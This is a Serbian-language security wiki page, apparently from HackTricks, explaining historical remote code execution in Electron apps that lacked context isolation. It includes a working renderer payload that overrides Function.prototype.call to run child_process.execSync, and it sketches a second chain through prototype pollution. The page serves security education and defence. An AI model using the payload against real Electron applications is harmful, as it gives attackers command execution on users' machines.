# RCE kroz Electron-ov interni kod pomoću izolacije konteksta

{{#include ../../banners/hacktricks-training.md}}

Ovo su **istorijski obrasci eksploatacije** za Electron aplikacije koje su pokretale nepouzdan sadržaj renderera bez izolacije konteksta. Izolacija konteksta je podrazumevano omogućena od Electron-a 12 i i dalje se preporučuje kao bezbednosno podešavanje.<sup>[[1]](#references)</sup> Tačni interni detalji razlikuju se u zavisnosti od verzije Electron-a i Node.js-a, zato ponovite lanac napada koristeći verzije koje su uključene u ciljnu aplikaciju.

## Primer 1: zamena `Function.prototype.call`

Ovaj primer potiče iz prezentacije Masata Kinugave na CureCon-u.<sup>[[2]](#references)</sup>

U ovoj istorijskoj Electron verziji, interni ASAR kod registrovao je `exit` listener za proces. Pošto su kôd stranice i Electron-ov interni kôd delili JavaScript prototipove kada je izolacija konteksta bila onemogućena, kôd renderera mogao je da zameni `Function.prototype.call` pre nego što bi se pokrenuo interni listener.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Interna putanja koda Electron asar.js korišćena u primeru contextIsolation RCE](<../../images/image (1070).png>)

Listener je prosleđen kroz Node.js-ov mehanizam događaja. Originalna stranica je sadržala zastarelu putanju `bin/events.js`; izvorni kod iz istog istorijskog commit-a nalazi se u `lib/events.js`.<sup>[[5]](#references)</sup>

![Putanja koda Node events.js do koje stiže lanac Electron contextIsolation RCE](<../../images/image (793).png>)

Na ovoj putanji, `self` je Node.js-ov process objekat:

![Electron contextIsolation RCE putem internog Electron koda - Primer 1: Gde je "self" Node-ov process objekat](<../../images/image (700).png>)

Istorijski process objekat izlagao je putanju do `require`:

```
process.mainModule.require
```

Pošto je listener dispatcher pozvao handler prosleđujući mu process objekat, redefinisanje metode call moglo je da omogući pristup tom objektu i izvršavanje native komande:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Primer 2: prototype pollution

Prezentacija ElectroVolt prikazuje još jedan istorijski lanac koji pomoću prototype pollution-a pribavlja objekat `require`.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron dokumentacija - izolacija konteksta](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: zloupotreba nedostatka izolacije konteksta - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Istorijski izvorni kod Electrona - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning popularnih desktop aplikacija uz otkrivanje nove površine za napad na Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Istorijski izvorni kod Node.js-a - `lib/events.js` prosleđivanje listener-a](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
